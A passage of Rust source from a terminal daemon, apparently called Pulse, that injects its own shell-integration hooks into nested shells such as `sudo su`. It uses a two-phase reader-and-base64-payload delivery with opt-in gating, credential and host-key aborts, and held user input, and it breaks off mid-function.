//! nested-shell-hooks: making a nested shell a FIRST-CLASS hooked shell.
//!
//! The gap this closes (field-confirmed on four live ssh terminals, all four
//! with `nested_chain.cli_cwd = null` and `inner_cli = null` while claude was
//! running inside their `sudo su` root shells): Pulse's block integration is
//! delivered ONCE, as a one-shot rcfile the login shell sources
//! (`bootstrap::write_bashrc_remote`), and that rcfile deletes itself. A
//! `sudo su` starts a BRAND-NEW bash which never sourced any of it — so the
//! nested shell has no token, no PROMPT_COMMAND/DEBUG hooks, no OSC 133/7717,
//! no cwd reporting. Everything downstream fails from that one gap: no blocks,
//! no composer integration ("no Pulse integration in this shell"), no inner-CLI
//! attribution, therefore no `cli_cwd`, therefore an incomplete breadcrumb,
//! therefore v0.1.13's nested auto-resume could never arm in the field.
//!
//! The fix is symmetrical with how the OUTER shell got hooked: when the
//! tracker WITNESSES a nested-shell episode opening in an already-hooked
//! terminal (`Core::open_nested_chain` — the same single site for a
//! user-typed `sudo su` and for the F2 engine's auto-typed one), the daemon
//! mints a fresh token, registers it alongside the terminal's outer token
//! (`blocks::BlockStore::push_nested_token`), and types the hook body into
//! the new shell. This is Pulse's own runtime hook in a shell it watched
//! being spawned — exactly what the login rcfile is — NOT a change to the
//! user's profile: nothing is ever written to the remote filesystem and no rc
//! file on disk is touched, anywhere ([[no-shell-tampering]]).
//!
//! Delivery is two-phase because a tty echoes bytes when they ARRIVE, not
//! when the shell reads them: writing the reader line and its payload in one
//! go would echo the whole base64 wall. So phase 1 types the reader line
//! (`bootstrap::NESTED_READER`) and waits for its echo to COME BACK and
//! settle — which proves the remote shell has accepted and is executing it,
//! so `stty -echo` runs before the payload can arrive — and phase 2 then
//! writes the tagged base64 payload lines invisibly. Silence alone is never
//! taken as that proof (it is what a slow link looks like before the echo
//! arrives), and the deadline that bounds the wait grows with the link
//! measured on the echo itself (`ECHO_QUIET`, `echo_deadline`).
//!
//! Between the reader and its payload the shell is parked in the reader's
//! `read`s, and whatever reaches it next is what they consume. So every byte
//! of user input goes through `write_user_input`, and that and every line
//! Pulse types are serialized on the terminal's PTY writer lock: input in
//! that window is HELD and written right after the payload, a line submitted
//! before the reader makes the injection wait for the shell's answer to it,
//! and the reader itself evaluates nothing unless all four lines carry
//! Pulse's tags.
//!
//! The seam is then made to read as if NOTHING was typed. The reader line is
//! the only thing a terminal ever echoes, and phase 2 aims an erase payload
//! at it: `erase_start_row` asks the daemon's own mirror for the row that
//! echo starts on and returns one ONLY when the region from there to the
//! cursor holds exactly our line and nothing else, so the shell's
//! `\033[<row>;1H\033[J` can only ever wipe our own output before repainting
//! its prompt in place. Anything the mirror does not vouch for (the echo
//! scrolled off, the shell redrew, alt-screen) declines the erase and leaves
//! the line honestly visible. The journal keeps the literal truth — echo,
//! erase and all — and every renderer reproduces the same clean screen from
//! it, so no render-side special case exists anywhere. Nothing of the
//! injection reaches bash's history either, and it can never become a block
//! record (no hooks exist in that shell yet, and the parent's DEBUG trap is
//! process-local), so the sidebar, block history and Ctrl-R corpus never see
//! it.
//!
//! Every abort is honest and leaves the shell EXACTLY as it is today: a
//! credential prompt pending, an alt-screen TUI, an unknown shell family, a
//! chain deeper than the token cap, a payload that never announced itself —
//! each logs its reason and the terminal keeps working, unhooked in that
//! nested world, with the manual notice v0.1.13 already prints.

use super::*;
use std::io::Write;

/// Output must be quiet this long after the witnessed opener before the
/// reader line is typed — the same settle rule `reestablish` types under
/// (long enough for `sudo su` to paint its prompt, short enough to feel
/// instant).
const OPEN_QUIET: Duration = Duration::from_millis(700);

/// An opener that never settles within this window abandons the injection —
/// never type into a world in an unknown state.
const OPEN_TIMEOUT: Duration = Duration::from_secs(20);

/// After the reader line is typed, its echo must have COME BACK — and the
/// mirror must show our whole line, exactly where it was typed — and then
/// been quiet this long before the payload lines are written.
///
/// "Came back" is load-bearing and is checked separately (`Phase::AwaitEcho`'s
/// `rtt`). A journal that has not grown is equally consistent with "the echo
/// came and settled" and "the reader has not even reached the far end yet",
/// and on any link slower than this the second one is the truth: v0.1.14-21
/// fired on silence alone, so at ~600ms RTT the payload left before its
/// reader had been executed. The mirror could not yet vouch for a line it had
/// never seen, so the erase declined and the reader stayed on screen; and on a
/// loaded host the payload landed while `stty -echo` was still being exec'd,
/// so the base64 hook body printed too (field screenshot `wan600-02`,
/// rig-reproduced). The echo of our full line is the proof that the shell has
/// accepted it; the payload then needs one more trip to arrive, by which time
/// `stty -echo` has long run.
const ECHO_QUIET: Duration = Duration::from_millis(250);

/// The settle when the echo came back but the mirror does not vouch for our
/// whole line (a shell that redrew it, a line that scrolled): the shell still
/// demonstrably received it, so the payload goes out once things have been
/// quiet for this long or one measured round trip, whichever is longer. The
/// line will stay visible (the erase gate declines), never the payload.
const ECHO_QUIET_UNVOUCHED: Duration = Duration::from_secs(1);

/// ...and if no proof ever arrives, the payload is written ANYWAY at the
/// deadline. The reader line's `read` builtins block the shell until they get
/// their lines: abandoning after phase 1 would leave the user's shell wedged,
/// so this deadline must always fire. (Worst case the reader line stays
/// visible — never a broken shell.)
///
/// Adaptive, like completion's (`completion::comp_budget`, the same policy
/// function): before anything has been measured the deadline is the floor —
/// exactly the constant it replaces, so nothing gets shorter — and once the
/// first byte of the echo lands it grows to eight measured round trips,
/// clamped. A link slower than the floor still gets its echo measured before
/// the floor fires, because the measurement is the echo's FIRST byte.
const ECHO_DEADLINE_MIN: Duration = Duration::from_secs(5);
const ECHO_DEADLINE_MAX: Duration = Duration::from_secs(20);

/// The most user input held back while the shell is parked in our reads
/// (see `InputRoute::Hold`). Past it — a large paste — the payload goes out
/// at once and everything held follows it: nothing is ever dropped, and the
/// worst case is the old one (a visible line), not a wedged hold.
const HOLD_CAP: usize = 64 * 1024;

/// How long the injected shell has to announce itself with its own `init`
/// hook before the injection is declared a graceful skip (unknown shell
/// family, no `base64`, a shell that ate the payload). Generous: the payload
/// runs before the shell's next prompt, but a busy remote can lag.
const INIT_TIMEOUT: Duration = Duration::from_secs(10);

/// One nested-shell hook injection in flight.
#[derive(Debug, Clone)]
pub(super) struct NestHook {
    /// 1 for the first `sudo su`, 2 for a `su - deploy` inside it, …
    depth: usize,
    /// The lines to type (reader + four tagged payload lines).
    inj: bootstrap::NestedInjection,
    phase: Phase,
    /// The opener that started this episode — logged, never re-typed.
    opener: String,
    /// User input that arrived while the shell was parked in our `read`s
    /// (`Phase::AwaitEcho`). It is written right AFTER the payload, under the
    /// same writer lock, so the reads can only ever consume Pulse's lines and
    /// the user's bytes reach the shell intact, in order, once the reads are
    /// satisfied. Never dropped: every exit path delivers it.
    held: Vec<u8>,
}

#[derive(Debug, Clone, Copy)]
enum Phase {
    /// Armed at the witnessed opener; watching for output quiescence before
    /// the reader line is typed. `answer_from` is the journal length when the
    /// user last SUBMITTED a line here: until output grows past it the shell
    /// has not visibly answered that line, so its prompt row on screen is
    /// stale (see `open_action`'s `answer_pending`).
    AwaitQuiet {
        armed: Instant,
        last_len: u64,
        last_change: Instant,
        answer_from: Option<u64>,
    },
    /// The reader line was typed; waiting for its echo to come back and
    /// settle before the payload lines are written (see `ECHO_QUIET`).
    /// `rtt` is set the first time the journal grows after `sent`: the
    /// measured round trip, and the proof that the echo was observed.
    AwaitEcho {
        sent: Instant,
        last_len: u64,
        last_change: Instant,
        rtt: Option<Duration>,
    },
    /// The payload was written; waiting for the injected shell's `init`.
    AwaitInit { sent: Instant },
    /// The injected shell announced itself: this nested world is hooked.
    Hooked,
}

/// Why an injection was not armed (pure verdict, table-tested).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ArmVerdict {
    /// Inject.
    Arm,
    /// The terminal's OWN shell never hooked — there is no witnessed
    /// episode to trust and no prompt lane to inject at (a hookless spawn
    /// keeps its pre-nested behavior exactly).
    NotHooked,
    /// pwsh/cmd, and the opener does not cross into a POSIX world: the hook
    /// body is bash/zsh, and a nested `bash`/`sudo su` typed at a Windows
    /// prompt lands in whatever happens to be on PATH — a world Pulse never
    /// set up. (typed-ssh-nested: a CROSSING opener — `ssh <host>`, `wsl`,
    /// `docker exec -it … bash` — does reach a POSIX world in one step and
    /// is armed even from pwsh.)
    WrongFamily,
    /// `ShellCfg.auto_reestablish` off — the one switch that governs Pulse
    /// typing into the user's shell on its own.
    OptedOut,
    /// A Claude-KIND terminal: its pin lifecycle owns it.
    PinnedKind,
    /// The nested chain is deeper than the token cap.
    TooDeep,
}

/// The launch/witness-time arm gate (pure). `hooked` is the spawn's real
/// hook verdict, `posix_world` that the nested shell will run in a POSIX
/// world the bash/zsh hook body fits — the family is hook-fed (WSL/ssh) OR
/// the opener crosses into one (typed-ssh-nested) — `opt_in` the
/// per-terminal switch, `claude_kind` the pinned terminal class, `depth` the
/// nested tokens already registered.
pub(crate) fn arm_verdict(
    hooked: bool,
    posix_world: bool,
    opt_in: bool,
    claude_kind: bool,
    depth: usize,
) -> ArmVerdict {
    if claude_kind {
        return ArmVerdict::PinnedKind;
    }
    if !posix_world {
        return ArmVerdict::WrongFamily;
    }
    if !hooked {
        return ArmVerdict::NotHooked;
    }
    if !opt_in {
        return ArmVerdict::OptedOut;
    }
    if depth >= blocks::NESTED_TOKEN_MAX {
        return ArmVerdict::TooDeep;
    }
    ArmVerdict::Arm
}

/// What the phase-1 watcher should do with the settled/unsettled opener
/// (pure, so the whole gating matrix is table-testable without a PTY).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum OpenAction {
    /// Not settled yet — keep watching.
    Wait,
    /// The settled tail line demands a secret: the nested shell has not even
    /// started yet, and typing now would push our plumbing into a password
    /// prompt. Abandon (the SAME predicate `reestablish` aborts a chain on —
    /// one classifier, zero drift).
    AbortCredential,
    /// A full-screen program owns the terminal — there is no prompt to type
    /// at and our line would land inside a TUI.
    AbortAlt,
    /// typed-ssh-nested: the settled tail line is ssh's HOST-KEY
    /// confirmation (`… (yes/no/[fingerprint])?`). It is not a credential,
    /// but it is a trust decision that is the USER's alone to make — and it
    /// is the specific hazard of a typed `ssh`: the line is a question, so
    /// the shell-prompt gate would only have parked us on it for 20 s. Abort
    /// loudly instead. Anything typed here would be answered as `yes`/`no`.
    AbortHostKey,
    /// Settled and quiet, but the cursor row does not READ as a shell prompt
    /// — the nested shell is showing something else that wants keys (field
    /// case: a brand-new account whose zsh runs `zsh-newuser-install`, a
    /// full-screen menu that ate our line one keypress at a time and left the
    /// remainder strewn across the scrollback). Keep watching rather than
    /// abort: a banner or a wizard the user dismisses is followed by a real
    /// prompt, and `AbortTimeout` still bounds the wait.
    WaitForPrompt,
    /// Never settled at a prompt: the world's state is unknown.
    AbortTimeout,
    /// Settled, quiet, at an ordinary prompt: type the reader line.
    Send,
}

/// The phase-1 decision (pure). `quiet_for` = time since the journal last
/// grew, `since_armed` = time since the opener was witnessed. The credential,
/// alt-screen and prompt-shape checks all run at the SETTLED edge, where the
/// cursor row is whatever the nested world is waiting at.
///
/// `answer_pending`: the user submitted a line here and the shell has not
/// produced a byte since. On a slow link that is a long time — a whole round
/// trip — and the screen in the meantime still shows the OLD prompt, quiet
/// and prompt-shaped. Every settled-edge signal reads "go", and the reader
/// line was typed into whatever the user had just started: a `cat > notes`
/// wrote Pulse's reader and its 7KB payload into the user's file, and a
/// `sudo -v` would have taken them as its password (rig-reproduced at 600ms
/// RTT). Nothing on the screen is evidence until the shell has answered.
pub(crate) fn open_action(
    since_armed: Duration,
    quiet_for: Duration,
    tail_is_credential: bool,
    tail_is_hostkey: bool,
    alt_screen: bool,
    at_prompt: bool,
    answer_pending: bool,
) -> OpenAction {
    if since_armed >= OPEN_TIMEOUT {
        return OpenAction::AbortTimeout;
    }
    if answer_pending || quiet_for < OPEN_QUIET {
        return OpenAction::Wait;
    }
    if alt_screen {
        return OpenAction::AbortAlt;
    }
    if tail_is_credential {
        return OpenAction::AbortCredential;
    }
    if tail_is_hostkey {
        return OpenAction::AbortHostKey;
    }
    if !at_prompt {
        return OpenAction::WaitForPrompt;
    }
    OpenAction::Send
}

/// What an injection-growth tick means (pure). `AwaitQuiet` used to re-base
/// the quiescence clock and `continue` PAST `open_action`, so OPEN_TIMEOUT —
/// the only bound on a nested world that never settles — was never evaluated
/// while output kept arriving. The absolute deadline is asked FIRST now, with
/// `quiet_for = 0` and every settled-edge signal false, which can only answer
/// Wait or AbortTimeout.
pub(crate) fn growth_action(since_armed: Duration) -> OpenAction {
    open_action(since_armed, Duration::ZERO, false, false, false, false, false)
}

/// The phase-2 deadline: the floor until the link has been measured, then
/// eight measured round trips, clamped (`completion::comp_budget` — one
/// latency policy for both of Pulse's typed lanes).
pub(crate) fn echo_deadline(rtt: Option<Duration>) -> Duration {
    completion::comp_budget(rtt, ECHO_DEADLINE_MIN, ECHO_DEADLINE_MAX)
}

/// The phase-2 decision (pure): write the payload once the reader's echo has
/// demonstrably come back and settled, and ALWAYS by the deadline — a shell
/// parked in `read` must never be left waiting.
///
/// `rtt` is None until the first byte of the echo lands, and silence before
/// that proves nothing (see `ECHO_QUIET`). `vouched` = the mirror shows our
/// whole line exactly where it was typed (`erase_start_row` found it), which
/// is also what lets the erase wipe it.
pub(crate) fn echo_ready(
    since_sent: Duration,
    quiet_for: Duration,
    rtt: Option<Duration>,
    vouched: bool,
) -> bool {
    if since_sent >= echo_deadline(rtt) {
        return true;
    }
    let Some(rtt) = rtt else {
        return false;
    };
    let settle = if vouched {
        ECHO_QUIET
    } else {
        ECHO_QUIET_UNVOUCHED.max(rtt)
    };
    quiet_for >= settle
}

/// Where an injection is, as far as user input is concerned.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum InputWindow {
    /// No injection, or one past the reads (payload out, or hooked).
    Open,
    /// Phase 1: nothing typed yet.
    BeforeReader,
    /// Phase 2: the reader is typed and the payload is not — the shell is
    /// (or is about to be) parked in our `read`s.
    InReads,
}

/// What to do with user input that arrives now (pure).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum InputRoute {
    /// Write it now.
    Deliver,
    /// Phase 1, a SUBMITTED line (composer `SubmitCommand`, or raw bytes
    /// ending in Enter): write it, keep the injection, and wait for the
    /// shell to answer it before trusting the screen again (see
    /// `open_action`). This is the common field path — `sudo su` and then a
    /// command straight away — and abandoning would lose the integration for
    /// the whole episode.
    DeliverAwaitAnswer,
    /// Phase 1, PARTIAL typing (no Enter): a half-typed line is in the
    /// shell's buffer and our reader would be appended to THEIR command.
    /// Abandon the injection, always, and write the bytes.
    DeliverAbandon,
    /// Phase 2: HOLD the bytes and write them right after the payload. Two
    /// alternatives were wrong. Writing them now puts them between the reader
    /// and its payload, where the reader's `read`s take them as payload: the
    /// user's command never runs, the payload shifts by one line, and before
    /// the tag gate the shifted lines went straight to `eval`. Flushing the
    /// payload early, ahead of them (v0.1.14-21), keeps the order but writes
    /// the payload before its echo is proven, so on a slow link it is printed
    /// on screen (rig-reproduced: the user's command ran, under a wall of
    /// base64). Held, the payload waits for its proof and the user's bytes
    /// follow it.
    Hold,
    /// Phase 2, but the hold would outgrow `HOLD_CAP`: write the payload now
    /// (its proof is forfeit — the old flush), then everything held, then
    /// these bytes.
    FlushThenDeliver,
}

/// The input router (pure). `held_after` = how many bytes would be held if
/// these were added.
pub(crate) fn input_route(window: InputWindow, submitted: bool, held_after: usize) -> InputRoute {
    match window {
        InputWindow::Open => InputRoute::Deliver,
        InputWindow::BeforeReader if submitted => InputRoute::DeliverAwaitAnswer,
        InputWindow::BeforeReader => InputRoute::DeliverAbandon,
        InputWindow::InReads if held_after > HOLD_CAP => InputRoute::FlushThenDeliver,
        InputWindow::InReads => InputRoute::Hold,
    }
}

impl Phase {
    fn input_window(&self) -> InputWindow {
        match self {
            Phase::AwaitQuiet { .. } => InputWindow::BeforeReader,
            Phase::AwaitEcho { .. } => InputWindow::InReads,
            Phase::AwaitInit { .. } | Phase::Hooked => InputWindow::Open,
        }
    }
}

/// The injection's state machine, pure — no PTY, no locks, no clock of its
/// own — so the tests drive exactly what the pump and the input path run, on
/// a synthetic timeline. The `Core` methods are these plus locking and I/O.
impl NestHook {
    fn new(depth: usize, inj: bootstrap::NestedInjection, opener: &str, len: u64, now: Instant) -> Self {
        NestHook {
            depth,
            inj,
            phase: Phase::AwaitQuiet {
                armed: now,
                last_len: len,
                last_change: now,
                answer_from: None,
            },
            opener: opener.to_string(),
            held: Vec::new(),
        }
    }

    /// User input arrives (the caller holds the terminal's writer). Applies
    /// the route's effect on this entry and returns it; `DeliverAbandon`
    /// tells the caller to drop the entry. `len` = the journal length now.
    fn route_input(&mut self, bytes: &[u8], submitted: bool, len: Option<u64>, now: Instant) -> InputRoute {
        let route = input_route(self.phase.input_window(), submitted, self.held.len() + bytes.len());
        match route {
            InputRoute::DeliverAwaitAnswer => {
                if let Phase::AwaitQuiet {
                    last_len,
                    last_change,
                    answer_from,
                    ..
                } = &mut self.phase
                {
                    *answer_from = Some(len.unwrap_or(*last_len));
                    *last_change = now;
                }
            }
            InputRoute::Hold => self.held.extend_from_slice(bytes),
            InputRoute::Deliver | InputRoute::DeliverAbandon | InputRoute::FlushThenDeliver => {}
        }
        route
    }

    /// The journal grew to `len`: re-base the quiescence clock for whichever
    /// phase is watching it. In phase 1 the growth may be the shell ANSWERING
    /// a line the user submitted (`answer_from`); in phase 2 the first growth
    /// is the echo coming back — both the proof and the link measurement.
    fn on_growth(&mut self, len: u64, now: Instant) {
        match &mut self.phase {
            Phase::AwaitQuiet {
                last_len,
                last_change,
                answer_from,
                ..
            } => {
                *last_len = len;
                *last_change = now;
                if answer_from.is_some_and(|from| len > from) {
                    *answer_from = None;
                }
            }
            Phase::AwaitEcho {
                sent,
                last_len,
                last_change,
                rtt,
            } => {
                *last_len = len;
                *last_change = now;
                if rtt.is_none() {
                    *rtt = Some(now.duration_since(*sent));
                }
            }
            Phase::AwaitInit { .. } | Phase::Hooked => {}
        }
    }

    /// Phase 1 → 2 (the caller holds the writer and types the reader right
    /// after): only if nothing changed since the pump judged the screen at
    /// journal length `seen` — no output since (`len`), and no submitted
    /// line still unanswered. None = do not type.
    fn begin_reader(&mut self, seen: u64, len: u64, now: Instant) -> Option<String> {
        match self.phase {
            Phase::AwaitQuiet {
                answer_from: None, ..
            } if len == seen => {
                self.phase = Phase::AwaitEcho {
                    sent: now,
                    last_len: len,
                    last_change: now,
                    rtt: None,
                };
                Some(self.inj.reader.clone())
            }
            _ => None,
        }
    }

    /// Phase 2, one pump tick with no growth: Some(why) when the payload
    /// should go out now. `vouched` is asked only once the echo has been seen
    /// and has gone quiet — the only moment the mirror's answer can matter.
    fn echo_due(&self, now: Instant, vouched: impl FnOnce() -> bool) -> Option<&'static str> {
        let Phase::AwaitEcho {
            sent,
            last_change,
            rtt,
            ..
        } = self.phase
        else {
            return None;
        };
        let quiet_for = now.duration_since(last_change);
        let vouched = rtt.is_some() && quiet_for >= ECHO_QUIET && vouched();
        if !echo_ready(now.duration_since(sent), quiet_for, rtt, vouched) {
            return None;
        }
        Some(match (rtt, vouched) {
            (None, _) => "no echo came back by the deadline",
            (Some(_), true) => "the reader's echo came back and settled",
            (Some(_), false) => "the reader's echo came back (the mirror does not vouch for it)",
        })
    }

    /// Phase 2, a tick WITH growth: only the absolute deadline may fire —
    /// a shell parked in our `read` must never be left waiting, however
    /// loud the output.
    fn echo_overdue(&self, now: Instant) -> bool {
        match self.phase {
            Phase::AwaitEcho { sent, rtt, .. } => {
                echo_ready(now.duration_since(sent), Duration::ZERO, rtt, false)
            }
            _ => false,
        }
    }

    /// Phase 2 → 3 (the caller holds the writer and writes, in this order,
    /// the four payload lines and then the held input): fix the erase row,
    /// move to `AwaitInit`, and hand both over. None when the payload already
    /// went out.
    fn take_payload(&mut self, erase_row: Option<usize>, now: Instant) -> Option<([String; 4], Vec<u8>)> {
        if !matches!(self.phase, Phase::AwaitEcho { .. }) {
            return None;
        }
        self.inj.erase_row = erase_row;
        self.phase = Phase::AwaitInit { sent: now };
        Some((self.inj.payload_lines(), std::mem::take(&mut self.held)))
    }
}

/// What became of user input handed to `Core::write_user_input`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Delivery {
    /// Written to the PTY now.
    Written,
    /// Held while the shell is parked in a hook injection's reads; written
    /// right after its payload (or by whatever ends the injection first).
    Held,
    /// No live session to write to.
    NoSession,
}

/// Write one typed line + Enter to an already-locked PTY writer. False when
/// any leg failed: a half-written line is worse than none, so callers abandon.
pub(super) fn write_line(w: &mut (dyn Write + Send), line: &str) -> bool {
    w.write_all(line.as_bytes()).is_ok() && w.write_all(b"\r").is_ok() && w.flush().is_ok()
}

/// The erase gate (pure): the 0-based screen row our echoed reader line
/// STARTS on, or `None` — in which case nothing is erased and the line
/// honestly stays visible.
///
/// This is the byte-exact proof that we only ever wipe our OWN output.
/// `rows` are the mirror's rows 0..=`cursor_row` verbatim (space-padded, as
/// the grid holds them). Walking UP from the cursor row, the tightest region
/// whose joined text ends with exactly our reader line is our echo — a row
/// higher would erase more than we typed, a row lower would leave part of it.
/// Requirements, all of them load-bearing:
///
///   - the joined text must END with the reader line: anything printed after
///     it means the shell moved on and the region is no longer only ours;
///   - the match is on the reader line TRIMMED (bash echoes the leading
///     space, zsh's line editor does not) and joined with NO separator, which
///     is exactly how a wrapped line lands in the grid;
///   - `None` when the line is not found in the last screenful at all — the
///     usual cause is that the top of the echo already scrolled into
///     scrollback, where an erase could never reach it anyway.
///
/// The row it returns is the row the PROMPT is on (our echo starts after the
/// prompt text on that same row). Erasing from its column 0 takes the prompt
/// with it, which is correct: the shell repaints the prompt right there, and
/// the seam reads as if nothing was typed.
pub(crate) fn erase_start_row(
    rows: &[String],
    cursor_row: usize,
    reader: &str,
) -> Option<usize> {
    let needle = reader.trim();
    if needle.is_empty() || cursor_row >= rows.len() {
        return None;
    }
    let mut joined = String::new();
    for start in (0..=cursor_row).rev() {
        joined.clear();
        for row in &rows[start..=cursor_row] {
            joined.push_str(row);
        }
        if joined.trim_end().ends_with(needle) {
            return Some(start);
        }
    }
    None
}

/// nested-shell-hooks: what the re-establish engine needs to know before it
/// types the inner-CLI resume (see `reestablish::pump_reestablish`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum NestState {
    /// No injection for this terminal — resume immediately (v0.1.13 lane).
    Absent,
    /// An injection is armed or in flight — WAIT: resuming now would run
    /// claude in a shell that is about to be hooked, losing the attribution
    /// the whole feature exists for.
    Pending,
    /// The nested shell is hooked — resume now, and the exec hook will
    /// attribute it.
    Hooked,
}

impl Core {
    /// Arm an injection for a WITNESSED nested-shell episode. The single
    /// call site is `open_nested_chain`, which fires only from a
    /// token-checked exec hook classified by `tracker::nested_shell_cmd` —
    /// so an injection can never be armed for a shell Pulse did not watch
    /// being opened.
    pub(super) fn arm_nesthook(&self, id: Uuid, opener: &str) {
        // typed-ssh-nested: the episode marker is read BEFORE the state lock
        // (`hook_fed_family_ids` orders them this way; one order, no
        // deadlock).
        let episode_live = self.nested_open.lock().contains(&id);
        let (hooked, opt_in, claude_kind, posix_world) = {
            let state = self.state.lock();
            let Some(t) = state.terminal(id) else { return };
            let fam = crate::state::shell_family(&t.kind, &t.program, &t.args);
            // typed-ssh-nested: what has to be POSIX is the world the nested
            // shell RUNS IN, not the shell that typed the opener. Three ways
            // to be there:
            //   1. a hook-fed FAMILY (WSL/ssh) is already there;
            //   2. this very opener CROSSES (`ssh <host>`, `wsl`,
            //      `docker exec -it ... bash`) — one step, even from pwsh;
            //   3. a crossing episode is ALREADY live, so a plain `sudo su`
            //      typed inside it is depth 2 in a POSIX world (the
            //      `ssh host` → `sudo su` shape).
            let posix_world = matches!(
                fam,
                crate::state::ShellFamily::WslShell { .. }
                    | crate::state::ShellFamily::Ssh { .. }
            ) || crate::daemon::tracker::crosses_to_posix(opener)
                || (episode_live
                    && t.nested_chain.as_ref().is_some_and(|c| {
                        c.cmds
                            .first()
                            .is_some_and(|o| crate::daemon::tracker::crosses_to_posix(o))
                    }));
            (
                t.hooked,
                t.shell_cfg.clone().unwrap_or_default().auto_reestablish,
                matches!(t.kind, TermKind::Claude { .. }),
                posix_world,
            )
        };
        // The token is minted and REGISTERED before a byte is typed: the
        // injected shell's very first hook (its `init`) must already be
        // acceptable, or it would be logged as a spoof and the shell would
        // silently degrade — the exact failure mode this feature must never
        // have.
        let token = bootstrap::mint_token();
        let depth = {
            let mut map = self.blocks.lock();
            let Some(store) = map.get_mut(&id) else { return };
            let already = store.nested_depth();
            match arm_verdict(hooked, posix_world, opt_in, claude_kind, already) {
                ArmVerdict::Arm => {}
                why => {
                    // WrongFamily is the pwsh/cmd common case — debug, not a
                    // warning about something the user should act on.
                    log::debug!(
                        "terminal {id}: nested hook injection skipped ({why:?}) for {}",
                        opener.trim()
                    );
                    return;
                }
            }
            match store.push_nested_token(token.clone()) {
                Some(d) => d,
                None => {
                    log::info!("terminal {id}: nested hook injection skipped (token cap reached)");
                    return;
                }
            }
        };
        let len = self
            .journal(id)
            .map(|j| j.lock().absolute_len())
            .unwrap_or(0);
        let now = Instant::now();
        let inj = bootstrap::nested_injection(&token);
        debug_assert!(inj.within_line_limit(), "injected line exceeds the canonical-mode cap");
        // A previous entry is superseded; anything it was holding for the
        // user is delivered first, never dropped.
        self.remove_nesthook(id, None);
        self.nesthooks
            .lock()
            .insert(id, NestHook::new(depth, inj, opener.trim(), len, now));
        log::info!(
            "terminal {id}: nested hook injection armed (depth {depth}, opener {}) — waiting for the nested prompt to settle",
            opener.trim()
        );
    }

    /// Stop an injection, logged (only when one was in flight).
    pub(super) fn cancel_nesthook(&self, id: Uuid, why: &str) {
        self.remove_nesthook(id, Some(why));
    }

    /// Drop the injection entry, delivering anything it was holding for the
    /// user. `why` = Some logs the stop (unless the shell was already hooked:
    /// a hooked entry retiring with its world is not news); None is silent.
    ///
    /// Must never be called with the terminal's PTY writer held. An entry
    /// holding nothing is removed under the map lock alone; after that, any
    /// input sees no entry and is written directly, so nothing can be lost.
    /// One holding bytes is removed UNDER THE WRITER LOCK and its bytes are
    /// written before the lock is released, so input arriving meanwhile
    /// queues behind them instead of overtaking them.
    pub(super) fn remove_nesthook(&self, id: Uuid, why: Option<&str>) {
        let log_stop = |e: &NestHook| {
            if let Some(why) = why {
                if !matches!(e.phase, Phase::Hooked) {
                    log::info!(
                        "terminal {id}: nested hook injection stopped at depth {} — {why}",
                        e.depth
                    );
                }
            }
        };
        {
            let mut map = self.nesthooks.lock();
            match map.get(&id) {
                None => return,
                Some(e) if e.held.is_empty() => {
                    if let Some(e) = map.remove(&id) {
                        log_stop(&e);
                    }
                    return;
                }
                Some(_) => {}
            }
        }
        let writer = self.sessions.lock().get(&id).map(|s| s.writer.clone());
        let mut guard = writer.as_ref().map(|w| w.lock());
        let Some(e) = self.nesthooks.lock().remove(&id) else {
            return;
        };
        log_stop(&e);
        if e.held.is_empty() {
            return;
        }
        let delivered = guard
            .as_mut()
            .is_some_and(|w| w.write_all(&e.held).is_ok() && w.flush().is_ok());
        if delivered {
            log::info!(
                "terminal {id}: {} byte(s) of input held during the hook injection delivered",
                e.held.len()
            );
        } else {
            log::info!(
                "terminal {id}: {} byte(s) of input held during the hook injection could not be \
                 delivered — the session is gone",
                e.held.len()
            );
        }
    }

    /// THE way user (and controller) input reaches a terminal: `C2D::Input`,
    /// a composer `SubmitCommand` and `ctl send`/`key`/`run` all come through
    /// here.
    ///
    /// Everything that decides where input goes, and everything Pulse types
    /// on its own, is serialized on the terminal's PTY writer lock. Before,
    /// the notifications ran first and the write came after, unlocked, while
    /// the pump typed on its own thread — so between "the injection is not
    /// typing yet" and the user's write, the pump could type the reader line,
    /// and the user's line landed between the reader and its payload, where
    /// the reader's `read`s took it as payload (the H2 shape). The same gap
    /// let a chain step be typed onto a half-typed line. Under the lock, input
    /// either lands entirely before Pulse's line (and the injection sees it)
    /// or entirely after the payload.
    pub(super) fn write_user_input(
        &self,
        id: Uuid,
        bytes: &[u8],
        why: &str,
    ) -> std::io::Result<Delivery> {
        let submitted = bytes.last().is_some_and(|b| *b == b'\r' || *b == b'\n');
        // remote-completion: flushes its own payload ahead of these bytes if
        // a query is parked in `__tc_cq`. It writes, so it runs BEFORE the
        // writer is taken (the lock is not re-entrant).
        self.comp_on_input(id);
        let Some(writer) = self.sessions.lock().get(&id).map(|s| s.writer.clone()) else {
            // No session: the notifications still apply (a dead terminal's
            // chain must not type into its successor's first line).
            self.cancel_reestablish(id, why);
            return Ok(Delivery::NoSession);
        };
        let mut w = writer.lock();
        // F2: the user typing takes the shell back — any in-flight chain
        // re-establish stops, under the lock its typing takes too.
        self.cancel_reestablish(id, why);
        if !self.nesthook_route_locked(id, bytes, submitted, &mut **w) {
            return Ok(Delivery::Held);
        }
        w.write_all(bytes)?;
        w.flush()?;
        Ok(Delivery::Written)
    }

    /// The injection's half of `write_user_input`, called with the writer
    /// held. Returns whether the caller should write the bytes now.
    fn nesthook_route_locked(
        &self,
        id: Uuid,
        bytes: &[u8],
        submitted: bool,
        w: &mut (dyn Write + Send),
    ) -> bool {
        let now = Instant::now();
        // Read before the map lock (the journal lock is its own leaf): the
        // length at the moment of a submit is what the answer must exceed.
        let len = self.journal_len(id);
        let route = {
            let mut map = self.nesthooks.lock();
            let Some(e) = map.get_mut(&id) else {
                return true;
            };
            let first_hold = e.held.is_empty();
            let route = e.route_input(bytes, submitted, len, now);
            match route {
                InputRoute::DeliverAbandon => {
                    map.remove(&id);
                    log::info!(
                        "terminal {id}: nested hook injection stopped — the user is typing at the nested prompt"
                    );
                }
                InputRoute::Hold if first_hold => log::info!(
                    "terminal {id}: input arrived while the shell is parked in the hook \
                     injection's reads — held until the payload is out"
                ),
                _ => {}
            }
            route
        };
        match route {
            InputRoute::Hold => false,
